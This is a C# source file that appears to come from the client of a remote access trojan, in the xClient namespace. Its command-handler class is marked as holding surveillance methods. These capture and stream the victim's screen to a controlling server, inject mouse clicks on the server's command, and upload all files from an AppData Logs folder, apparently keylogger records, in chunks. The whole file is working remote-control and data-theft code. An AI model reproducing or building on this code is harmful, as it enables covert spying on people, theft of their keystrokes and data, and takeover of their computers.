using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using xClient.Core.Helper;
using System.Drawing.Imaging;
using System.Threading;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
    public static partial class CommandHandler
    {
        public static void HandleRemoteDesktop(Packets.ServerPackets.Desktop command, Client client)
        {
            if (StreamCodec == null || StreamCodec.ImageQuality != command.Quality ||
                StreamCodec.Monitor != command.Monitor)
                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor);

            LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Monitor);
            BitmapData bmpdata = LastDesktopScreenshot.LockBits(
                new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), ImageLockMode.ReadWrite,
                LastDesktopScreenshot.PixelFormat);

            using (MemoryStream stream = new MemoryStream())
            {
                try
                {
                    StreamCodec.CodeImage(bmpdata.Scan0,
                        new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
                        new Size(LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
                        LastDesktopScreenshot.PixelFormat,
                        stream);
                    new Packets.ClientPackets.DesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
                        StreamCodec.Monitor).Execute(client);
                }
                catch
                {
                    new Packets.ClientPackets.DesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor)
                        .Execute(client);
                    StreamCodec = null;
                }
            }

            LastDesktopScreenshot.UnlockBits(bmpdata);
            LastDesktopScreenshot.Dispose();
        }

        public static void HandleMouseClick(Packets.ServerPackets.MouseClick command, Client client)
        {
            Screen[] allScreens = Screen.AllScreens;
            int offsetX = allScreens[command.MonitorIndex].Bounds.X;
            int offsetY = allScreens[command.MonitorIndex].Bounds.Y;
            Point p = new Point(command.X + offsetX, command.Y + offsetY);

            if (command.LeftClick)
            {
                SetCursorPos(p.X, p.Y);
                mouse_event(MOUSEEVENTF_LEFTDOWN, p.X, p.Y, 0, 0);
                mouse_event(MOUSEEVENTF_LEFTUP, p.X, p.Y, 0, 0);
                if (command.DoubleClick)
                {
                    mouse_event(MOUSEEVENTF_LEFTDOWN, p.X, p.Y, 0, 0);
                    mouse_event(MOUSEEVENTF_LEFTUP, p.X, p.Y, 0, 0);
                }
            }
            else
            {
                SetCursorPos(p.X, p.Y);
                mouse_event(MOUSEEVENTF_RIGHTDOWN, p.X, p.Y, 0, 0);
                mouse_event(MOUSEEVENTF_RIGHTUP, p.X, p.Y, 0, 0);
                if (command.DoubleClick)
                {
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, p.X, p.Y, 0, 0);
                    mouse_event(MOUSEEVENTF_RIGHTUP, p.X, p.Y, 0, 0);
                }
            }
        }

        public static void HandleMonitors(Packets.ServerPackets.Monitors command, Client client)
        {
            new Packets.ClientPackets.MonitorsResponse(Screen.AllScreens.Length).Execute(client);
        }

        public static void HandleGetLogs(Packets.ServerPackets.GetLogs command, Client client)
        {
            new Thread(() =>
            {
                try
                {
                    int index = 1;
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";

                    if (!Directory.Exists(path))
                    {
                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    FileInfo[] iFiles = new DirectoryInfo(path).GetFiles();

                    if (iFiles.Length == 0)
                    {
                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    foreach (FileInfo file in iFiles)
                    {
                        FileSplit srcFile = new FileSplit(file.FullName);

                        if (srcFile.MaxBlocks < 0)
                            new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);

                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                        {
                            byte[] block;
                            if (srcFile.ReadBlock(currentBlock, out block))
                            {
                                new Packets.ClientPackets.GetLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
                                //Thread.Sleep(200);
                            }
                            else
                                new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
                        }

                        index++;
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
                }
            }).Start();
        }
    }
}